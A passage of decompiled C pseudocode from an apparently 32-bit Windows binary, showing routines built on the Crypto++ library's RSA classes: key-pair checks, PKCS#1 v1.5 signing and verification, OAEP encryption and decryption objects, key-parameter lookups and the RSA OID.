  if ( !sub_441EE0(v66 + 18, v67, (int *)&v64) || !sub_441EE0(v19 + 24, v20, (int *)&v64) )
  {
    sub_43D8D0(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVRandomNumberNotFound_Integer_CryptoPP__);
  }
  sub_43D500(v83, 1u);
  LOBYTE(v72) = 12;
  sub_43D500(v58, 1u);
  LOBYTE(v72) = 13;
  sub_4431A0(v19 + 24, v59, (int)v83);
  LOBYTE(v72) = 14;
  sub_4431A0(v19 + 18, v38, (int)v58);
  LOBYTE(v72) = 15;
  v21 = sub_4512E0(v82, v38, (int)v59);
  LOBYTE(v72) = 16;
  v22 = sub_442A60(v7, v37, v21);
  LOBYTE(v72) = 17;
  sub_43DBB0(v19 + 12, v22);
  sub_4066A0((int)v37);
  sub_4066A0((int)v82);
  sub_4066A0((int)v38);
  sub_4066A0((int)v59);
  sub_4066A0((int)v58);
  LOBYTE(v72) = 10;
  sub_4066A0((int)v83);
  sub_43D500(v59, 1u);
  LOBYTE(v72) = 18;
  sub_4431A0(v19 + 18, v58, (int)v59);
  LOBYTE(v72) = 19;
  sub_4432F0(v19 + 12, v83, v58);
  LOBYTE(v72) = 20;
  sub_43DBB0(v19 + 30, v83);
  sub_4066A0((int)v83);
  sub_4066A0((int)v58);
  LOBYTE(v72) = 10;
  sub_4066A0((int)v59);
  sub_43D500(v59, 1u);
  LOBYTE(v72) = 21;
  sub_4431A0(v19 + 24, v58, (int)v59);
  LOBYTE(v72) = 22;
  sub_4432F0(v19 + 12, v83, v58);
  LOBYTE(v72) = 23;
  sub_43DBB0(v19 + 36, v83);
  sub_4066A0((int)v83);
  sub_4066A0((int)v58);
  LOBYTE(v72) = 10;
  sub_4066A0((int)v59);
  sub_44E440(v19 + 18, v83, (int)(v19 + 24));
  LOBYTE(v72) = 24;
  sub_43DBB0(v19 - 14, v83);
  LOBYTE(v72) = 10;
  sub_4066A0((int)v83);
  v23 = sub_442A60(v19 + 24, v82, v19 + 18);
  LOBYTE(v72) = 25;
  sub_43DBB0(v19 + 42, v23);
  LOBYTE(v72) = 10;
  sub_4066A0((int)v82);
  if ( sub_402000() )
  {
    v24 = *(v19 - 15);
    v36 = 1;
    v25 = (int)v19 + *(_DWORD *)(v24 + 4) - 60;
    sub_435E90(v74, 1);
    sub_414900(v75, 1);
    v73 = &CryptoPP::TF_SignerImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable';
    v74[0] = (int)&CryptoPP::TF_SignerImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable';
    v74[1] = (int)&CryptoPP::TF_SignerImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable';
    LOBYTE(v72) = 26;
    (*(void (__thiscall **)(char *, int))(*(int *)((char *)v76 + *(_DWORD *)(v76[0] + 4)) + 8))(
      (char *)v76 + *(_DWORD *)(v76[0] + 4),
      v25);
    LOBYTE(v72) = 27;
    sub_435E90(v45, 1);
    v47 = dword_4CD254;
    v67 = v46;
    v70 = 1020;
    v72 = 29;
    v46[0] = (int)&CryptoPP::RSAFunction::`vftable';
    v46[1] = (int)&CryptoPP::RSAFunction::`vftable';
    v50 = &CryptoPP::RSAFunction::`vftable';
    sub_43D6C0(v48);
    LOBYTE(v72) = 30;
    sub_43D6C0(v49);
    v44 = &CryptoPP::TF_VerifierImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable';
    v45[0] = (int)&CryptoPP::TF_VerifierImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable';
    v45[1] = (int)&CryptoPP::TF_VerifierImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable';
    LOBYTE(v72) = 31;
    v26 = *(int *)((char *)&v48[-1] + v47[1]);
    v27 = (*(int (__thiscall **)(int *))(v74[0] + 20))(v74);
    (*(void (__thiscall **)(char *, int))(v26 + 8))((char *)&v48[-1] + v47[1], v27);
    LOBYTE(v72) = 32;
    v36 = (int)&v44;
    v35 = &v73;
    v28 = (int)v19 + *(_DWORD *)(*(v19 - 15) + 4) - 60;
    sub_435E90(v78, 1);
    sub_414900(v79, 1);
    v77 = &CryptoPP::TF_DecryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
    v78[0] = (int)&CryptoPP::TF_DecryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
    v78[1] = (int)&CryptoPP::TF_DecryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
    LOBYTE(v72) = 33;
    (*(void (__thiscall **)(char *, int))(*(int *)((char *)v80 + *(_DWORD *)(v80[0] + 4)) + 8))(
      (char *)v80 + *(_DWORD *)(v80[0] + 4),
      v28);
    LOBYTE(v72) = 34;
    sub_435E90(v52, 1);
    v54 = dword_4CD254;
    v67 = v53;
    v70 = 2044;
    v72 = 36;
    v53[0] = (int)&CryptoPP::RSAFunction::`vftable';
    v53[1] = (int)&CryptoPP::RSAFunction::`vftable';
    v57 = &CryptoPP::RSAFunction::`vftable';
    sub_43D6C0(v55);
    LOBYTE(v72) = 37;
    sub_43D6C0(v56);
    v51 = &CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
    v52[0] = (int)&CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
    v52[1] = (int)&CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
    LOBYTE(v72) = 38;
    v29 = *(int *)((char *)&v55[-1] + v54[1]);
    v30 = (*(int (__thiscall **)(int *))(v78[0] + 20))(v78);
    (*(void (__thiscall **)(char *, int))(v29 + 8))((char *)&v55[-1] + v54[1], v30);
    LOBYTE(v72) = 39;
    v36 = (int)&v77;
    v35 = &v51;
    sub_40A6C0(v53);
    v57 = &CryptoPP::NameValuePairs::`vftable';
    sub_414B60(v79);
    v80[63] = (int)&CryptoPP::NameValuePairs::`vftable';
    sub_40A6C0(v46);
    v50 = &CryptoPP::NameValuePairs::`vftable';
    sub_414B60(v75);
    v76[63] = (int)&CryptoPP::NameValuePairs::`vftable';
  }
  LOBYTE(v72) = 40;
  if ( v65 )
    (**v65)(v65, 1);
  v64 = &CryptoPP::NameValuePairs::`vftable';
  v31 = v42;
  v32 = v43;
  if ( v41 < v42 )
    v31 = v41;
  v72 = 41;
  memset(v43, 0, 4 * v31);
  v36 = (int)v32;
  if ( v31 )
    j_j_unknown_libname_61(v36);
  else
    j_j___free_base((void *)v36);
}
// 406DC0: using guessed type _DWORD _guard_check_icall_nop();
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 4BB0C0: using guessed type void *CryptoPP::RSAFunction::`vftable';
// 4BB0E4: using guessed type void *CryptoPP::RSAFunction::`vftable';
// 4BB10C: using guessed type void *CryptoPP::RSAFunction::`vftable';
// 4BB204: using guessed type void *CryptoPP::RSAPrimeSelector::`vftable';
// 4BB20C: using guessed type void *CryptoPP::TF_SignerImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable';
// 4BB25C: using guessed type void *CryptoPP::TF_SignerImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable';
// 4BB280: using guessed type void *CryptoPP::TF_SignerImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable';
// 4BB294: using guessed type void *CryptoPP::TF_VerifierImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable';
// 4BB2EC: using guessed type void *CryptoPP::TF_VerifierImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable';
// 4BB310: using guessed type void *CryptoPP::TF_VerifierImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable';
// 4BB324: using guessed type void *CryptoPP::TF_DecryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
// 4BB350: using guessed type void *CryptoPP::TF_DecryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
// 4BB374: using guessed type void *CryptoPP::TF_DecryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
// 4BB388: using guessed type void *CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
// 4BB3B4: using guessed type void *CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
// 4BB3D8: using guessed type void *CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
// 4BB4A4: using guessed type void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::PrimeSelector const *>::`vftable';
// 4CD254: using guessed type _DWORD dword_4CD254[2];
// 4EE1D4: using guessed type int int `RTTI Type Descriptor';
// 450140: using guessed type _DWORD var_2B4[2];
// 450140: using guessed type _DWORD var_1C[6];
// 450140: using guessed type _DWORD var_2E4[6];
// 450140: using guessed type _DWORD var_2CC[6];
// 450140: using guessed type _DWORD var_3B0[6];
// 450140: using guessed type _DWORD var_34[6];
// 450140: using guessed type _DWORD var_3C8[6];
// 450140: using guessed type _DWORD var_260[2];
// 450140: using guessed type int var_364[6];
// 450140: using guessed type int var_34C[6];
// 450140: using guessed type _DWORD var_14C[2];
// 450140: using guessed type int var_318[6];
// 450140: using guessed type int var_300[6];

//----- (00450960) --------------------------------------------------------
_DWORD *__stdcall sub_450960(_DWORD *a1)
{
  _DWORD *v1; // eax
  _DWORD v3[4]; // [esp+4h] [ebp-3Ch] BYREF
  _DWORD v4[4]; // [esp+14h] [ebp-2Ch] BYREF
  _DWORD v5[4]; // [esp+24h] [ebp-1Ch] BYREF
  int v6; // [esp+3Ch] [ebp-4h]

  v1 = sub_43CCE0(v3);
  v6 = 0;
  sub_43A320(v5, (int)v1, 113549);
  sub_408A00(v3);
  v6 = 1;
  sub_43A320(v4, (int)v5, 1);
  sub_408A00(v5);
  v6 = 2;
  sub_43A320(v5, (int)v4, 1);
  sub_408A00(v4);
  v6 = 3;
  sub_43A320(a1, (int)v5, 1);
  sub_408A00(v5);
  return a1;
}
// 450960: using guessed type _DWORD var_3C[4];
// 450960: using guessed type _DWORD var_1C[4];
// 450960: using guessed type _DWORD var_2C[4];

//----- (00450A30) --------------------------------------------------------
_DWORD *__stdcall sub_450A30(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = &unk_4BCD00;
  a1[1] = 15;
  return result;
}

//----- (00450A50) --------------------------------------------------------
int sub_450A50()
{
  return sub_423EF0();
}

//----- (00450A60) --------------------------------------------------------
_DWORD *sub_450A60()
{
  _DWORD *result; // eax
  int v1; // esi

  if ( dword_4EEEE0 > *(_DWORD *)(*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex) + 4) )
  {
    _Init_thread_header(&dword_4EEEE0);
    if ( dword_4EEEE0 == -1 )
    {
      dword_4EEEDC = 0;
      atexit(sub_4B7910);
      _Init_thread_footer(&dword_4EEEE0);
    }
  }
  result = (_DWORD *)dword_4EEEDC;
  if ( !dword_4EEEDC )
  {
    result = operator new(4u);
    if ( result )
      *result = &CryptoPP::PKCS1v15_SignatureMessageEncodingMethod::`vftable';
    else
      result = 0;
    v1 = dword_4EEEDC;
    if ( dword_4EEEDC )
    {
      if ( result )
        (*(void (__thiscall **)(_DWORD *, int))*result)(result, 1);
      return (_DWORD *)v1;
    }
    else
    {
      dword_4EEEDC = (int)result;
    }
  }
  return result;
}
// 46C388: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 46C3D2: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BB060: using guessed type void *CryptoPP::PKCS1v15_SignatureMessageEncodingMethod::`vftable';
// 4EEEDC: using guessed type int dword_4EEEDC;
// 4EEEE0: using guessed type int dword_4EEEE0;
// 4F0864: using guessed type int TlsIndex;

//----- (00450A70) --------------------------------------------------------
char *__thiscall sub_450A70(char *this)
{
  return this + 188;
}

//----- (00450A80) --------------------------------------------------------
char *__thiscall sub_450A80(char *this)
{
  return this + 212;
}

//----- (00450A90) --------------------------------------------------------
char *__thiscall sub_450A90(char *this)
{
  return this + 236;
}

//----- (00450AA0) --------------------------------------------------------
char *__thiscall sub_450AA0(char *this)
{
  return this + 140;
}

//----- (00450AB0) --------------------------------------------------------
char *__thiscall sub_450AB0(char *this)
{
  return this + 164;
}

//----- (00450AC0) --------------------------------------------------------
char *__thiscall sub_450AC0(char *this)
{
  return this + 116;
}

//----- (00450AD0) --------------------------------------------------------
int __thiscall sub_450AD0(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 32))(this - 1) + 68;
}

//----- (00450AE0) --------------------------------------------------------
int __thiscall sub_450AE0(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 68))(this - 1) + 68;
}

//----- (00450AF0) --------------------------------------------------------
char *__thiscall sub_450AF0(char *this)
{
  return this + 36;
}

//----- (00450B00) --------------------------------------------------------
int __thiscall sub_450B00(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 76))(this - 1) + 8;
}

//----- (00450B10) --------------------------------------------------------
int __thiscall sub_450B10(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 2) + 68))(this - 2);
}

//----- (00450B20) --------------------------------------------------------
int __thiscall sub_450B20(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 2) + 76))(this - 2);
}

//----- (00450B30) --------------------------------------------------------
int __thiscall sub_450B30(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 2) + 32))(this - 2) + 60;
}

//----- (00450B40) --------------------------------------------------------
int __thiscall sub_450B40(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 2) + 68))(this - 2) + 60;
}

//----- (00450B50) --------------------------------------------------------
char __thiscall sub_450B50(void *this, char *a2, int a3, _DWORD *a4)
{
  void *v4; // esi
  char *v5; // eax
  void **v6; // eax
  const char *v7; // eax
  int v8; // eax
  _DWORD *v9; // esi
  char *v10; // edi
  void *v11; // eax
  void *v12; // eax
  void *v13; // eax
  void *v14; // eax
  void *v15; // eax
  _DWORD *v17; // [esp+50h] [ebp-14h] BYREF
  char *Str1; // [esp+54h] [ebp-10h]
  int v19; // [esp+58h] [ebp-Ch]
  char *v20; // [esp+5Ch] [ebp-8h]
  char v21; // [esp+60h] [ebp-4h]
  char v22; // [esp+61h] [ebp-3h]

  sub_44EEE0(&v17, (int)this - 260, a2, a3, a4, 0);
  if ( v22 )
  {
    v4 = (void *)__std_type_info_name(&dword_4EE7C4, &stru_4F0838);
    v5 = (char *)sub_41F120(v20, (void *)"ThisObject:", 0xBu);
    v6 = sub_41F120(v5, v4, strlen((const char *)v4));
    sub_419990((int)v6, 59);
  }
  if ( !v21 && !strncmp(Str1, "ThisObject:", 0xBu) )
  {
    v7 = (const char *)__std_type_info_name(&dword_4EE7C4, &stru_4F0838);
    v8 = strcmp(Str1 + 11, v7);
    if ( v8 )
      v8 = v8 < 0 ? -1 : 1;
    if ( !v8 )
    {
      sub_4059C0(Str1, (int)&CryptoPP::InvertibleRSAFunction `RTTI Type Descriptor', v19);
      v9 = v17;
      v10 = v20;
      sub_43DBB0((_DWORD *)v20 + 3, v17 + 3);
      sub_43DBB0((_DWORD *)v10 + 9, v9 + 9);
      sub_45F2D0((_DWORD *)v10 + 19, (int)(v9 + 19));
      sub_43DBB0((_DWORD *)v10 + 29, v9 + 29);
      sub_43DBB0((_DWORD *)v10 + 35, v9 + 35);
      sub_43DBB0((_DWORD *)v10 + 41, v9 + 41);
      sub_43DBB0((_DWORD *)v10 + 47, v9 + 47);
      sub_43DBB0((_DWORD *)v10 + 53, v9 + 53);
      sub_43DBB0((_DWORD *)v10 + 59, v9 + 59);
      v21 = 1;
    }
  }
  v11 = sub_44EAB0(&v17, "Prime1", (int (__thiscall *)(int))sub_450AA0, -8, 0);
  v12 = sub_44EAB0(v11, "Prime2", (int (__thiscall *)(int))sub_450AB0, -8, 0);
  v13 = sub_44EAB0(v12, "PrivateExponent", (int (__thiscall *)(int))sub_450AC0, -8, 0);
  v14 = sub_44EAB0(v13, "ModPrime1PrivateExponent", (int (__thiscall *)(int))sub_450A70, -8, 0);
  v15 = sub_44EAB0(v14, "ModPrime2PrivateExponent", (int (__thiscall *)(int))sub_450A80, -8, 0);
  return *((_BYTE *)sub_44EAB0(
                      v15,
                      "MultiplicativeInverseOfPrime2ModPrime1",
                      (int (__thiscall *)(int))sub_450A90,
                      -8,
                      0)
         + 16);
}
// 48388B: using guessed type _DWORD __cdecl __std_type_info_name(_DWORD, PSLIST_HEADER ListHead);
// 4EE7C4: using guessed type int dword_4EE7C4;

//----- (00450E20) --------------------------------------------------------
char __thiscall sub_450E20(void *this, char *a2, int a3, _DWORD *a4)
{
  void *v4; // esi
  char *v5; // eax
  void **v6; // eax
  const char *v7; // eax
  int v8; // eax
  int v9; // esi
  char *v10; // edi
  void *v11; // eax
  int v13; // [esp+20h] [ebp-14h] BYREF
  char *Str1; // [esp+24h] [ebp-10h]
  int v15; // [esp+28h] [ebp-Ch]
  char *v16; // [esp+2Ch] [ebp-8h]
  char v17; // [esp+30h] [ebp-4h]
  char v18; // [esp+31h] [ebp-3h]

  sub_44F0D0(&v13, (int)this - 60, a2, a3, a4, 0);
  if ( v18 )
  {
    v4 = (void *)__std_type_info_name(&dword_4ECFEC, &stru_4F0838);
    v5 = (char *)sub_41F120(v16, (void *)"ThisObject:", 0xBu);
    v6 = sub_41F120(v5, v4, strlen((const char *)v4));
    sub_419990((int)v6, 59);
  }
  if ( !v17 && !strncmp(Str1, "ThisObject:", 0xBu) )
  {
    v7 = (const char *)__std_type_info_name(&dword_4ECFEC, &stru_4F0838);
    v8 = strcmp(Str1 + 11, v7);
    if ( v8 )
      v8 = v8 < 0 ? -1 : 1;
    if ( !v8 )
    {
      sub_4059C0(Str1, (int)&CryptoPP::RSAFunction `RTTI Type Descriptor', v15);
      v9 = v13;
      v10 = v16;
      sub_43DBB0((_DWORD *)v16 + 3, (_DWORD *)(v13 + 12));
      sub_43DBB0((_DWORD *)v10 + 9, (_DWORD *)(v9 + 36));
      v17 = 1;
    }
  }
  v11 = sub_44EAB0(&v13, "Modulus", (int (__thiscall *)(int))sub_4174B0, -8, 0);
  return *((_BYTE *)sub_44EAB0(v11, "PublicExponent", (int (__thiscall *)(int))sub_450AF0, -8, 0) + 16);
}
// 48388B: using guessed type _DWORD __cdecl __std_type_info_name(_DWORD, PSLIST_HEADER ListHead);
// 4ECFEC: using guessed type int dword_4ECFEC;

//----- (00450FA0) --------------------------------------------------------
void __thiscall sub_450FA0(void (__thiscall ***this)(int, _DWORD, _DWORD *), int a2, _DWORD *a3, _DWORD *a4)
{
  _DWORD *v4; // esi
  char v5; // al
  _DWORD *v6; // eax
  int v7; // eax
  _DWORD *v8; // edi
  char v9; // bl
  _DWORD *v10; // eax
  _DWORD *v11; // esi
  _DWORD *v12; // eax
  void (__thiscall ***v13)(_DWORD, int); // ecx
  void (__thiscall ***v14)(_DWORD, int); // ecx
  unsigned int v15; // edx
  void *v16; // esi
  unsigned int v17; // edx
  void *v18; // esi
  _DWORD v19[2]; // [esp+10h] [ebp-5Ch] BYREF
  unsigned int v20; // [esp+18h] [ebp-54h]
  unsigned int v21; // [esp+1Ch] [ebp-50h]
  void *v22; // [esp+20h] [ebp-4Ch]
  _DWORD v23[2]; // [esp+28h] [ebp-44h] BYREF
  unsigned int v24; // [esp+30h] [ebp-3Ch]
  unsigned int v25; // [esp+34h] [ebp-38h]
  void *Block; // [esp+38h] [ebp-34h]
  void **v27; // [esp+40h] [ebp-2Ch] BYREF
  void (__thiscall ***v28)(_DWORD, int); // [esp+44h] [ebp-28h]
  void **v29; // [esp+4Ch] [ebp-20h] BYREF
  void (__thiscall ***v30)(_DWORD, int); // [esp+50h] [ebp-1Ch]
  void (__thiscall ***v31)(int, _DWORD, _DWORD *); // [esp+58h] [ebp-14h]
  int v32; // [esp+5Ch] [ebp-10h]
  int v33; // [esp+68h] [ebp-4h]

  v31 = this;
  v32 = 0;
  v4 = a4;
  v5 = sub_4428B0(a4, 0);
  sub_43D500(v19, v5 == 0);
  a4 = a3;
  v33 = 0;
  sub_443C50(v4, v23, (int)v19);
  v32 = 1;
  LOBYTE(v33) = 2;
  v6 = sub_4550C0(&v29);
  LOBYTE(v33) = 3;
  v7 = sub_426740((int)v6, (int)"ModulusSize", &a4, 1);
  v8 = sub_455040(&v27, v7);
  v32 = 3;
  LOBYTE(v33) = 4;
  if ( v30 )
    (**v30)(v30, 1);
  v29 = &CryptoPP::NameValuePairs::`vftable';
  v9 = *((_BYTE *)v8 + 8);
  LOBYTE(v33) = 2;
  v10 = operator new(0x28u);
  v11 = v10;
  a4 = v10;
  if ( v10 )
  {
    v10[1] = "PublicExponent";
    *((_BYTE *)v10 + 8) = v9;
    *((_BYTE *)v10 + 9) = 0;
    v10[3] = 0;
    LOBYTE(v33) = 6;
    *v10 = &CryptoPP::AlgorithmParametersTemplate<CryptoPP::Integer>::`vftable';
    sub_43D420(v10 + 4, v23);
  }
  else
  {
    v11 = 0;
  }
  v12 = (_DWORD *)v8[1];
  v8[1] = 0;
  v13 = (void (__thiscall ***)(_DWORD, int))v11[3];
  LOBYTE(v33) = 7;
  a4 = v12;
  if ( v13 )
  {
    (**v13)(v13, 1);
    v12 = a4;
  }
  v11[3] = v12;
  v14 = (void (__thiscall ***)(_DWORD, int))v8[1];
  if ( v14 )
    (**v14)(v14, 1);
  v8[1] = v11;
  *((_BYTE *)v8 + 8) = v9;
  LOBYTE(v33) = 2;
  (*v31[17])((int)(v31 + 17), a2, v8);
  LOBYTE(v33) = 9;
  if ( v28 )
    (**v28)(v28, 1);
  v27 = &CryptoPP::NameValuePairs::`vftable';
  v15 = v25;
  v16 = Block;
  if ( v24 < v25 )
    v15 = v24;
  LOBYTE(v33) = 10;
  memset(Block, 0, 4 * v15);
  if ( v15 )
    j_j_unknown_libname_61(v16);
  else
    j_j___free_base(v16);
  v17 = v21;
  v18 = v22;
  if ( v20 < v21 )
    v17 = v20;
  v33 = 11;
  memset(v22, 0, 4 * v17);
  if ( v17 )
    j_j_unknown_libname_61(v18);
  else
    j_j___free_base(v18);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 4BACD4: using guessed type void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::Integer>::`vftable';
// 450FA0: using guessed type _DWORD var_5C[2];
// 450FA0: using guessed type _DWORD var_44[2];

//----- (00451190) --------------------------------------------------------
bool __thiscall sub_451190(void *this, _DWORD *a2)
{
  int *v3; // eax
  _DWORD *v4; // esi
  int *v5; // eax
  bool v6; // bl
  unsigned int v7; // edx
  void *v8; // esi
  unsigned int v9; // edx
  void *v10; // esi
  int v12; // [esp+10h] [ebp-3Ch] BYREF
  unsigned int v13; // [esp+18h] [ebp-34h]
  unsigned int v14; // [esp+1Ch] [ebp-30h]
  void *Block; // [esp+20h] [ebp-2Ch]
  int v16; // [esp+28h] [ebp-24h] BYREF
  unsigned int v17; // [esp+30h] [ebp-1Ch]
  unsigned int v18; // [esp+34h] [ebp-18h]
  void *v19; // [esp+38h] [ebp-14h]
  int v20; // [esp+48h] [ebp-4h]

  v3 = sub_443600();
  sub_4431A0(a2, &v16, (int)v3);
  v20 = 0;
  v4 = sub_441D00(&v12, (int)this + 4);
  LOBYTE(v20) = 1;
  v5 = sub_443600();
  v6 = sub_440F30(v4, (int)v5) == 0;
  v7 = v14;
  v8 = Block;
  if ( v13 < v14 )
    v7 = v13;
  LOBYTE(v20) = 2;
  memset(Block, 0, 4 * v7);
  if ( v7 )
    j_j_unknown_libname_61(v8);
  else
    j_j___free_base(v8);
  v9 = v18;
  v10 = v19;
  if ( v17 < v18 )
    v9 = v17;
  v20 = 3;
  memset(v19, 0, 4 * v9);
  if ( v9 )
    j_j_unknown_libname_61(v10);
  else
    j_j___free_base(v10);
  return v6;
}
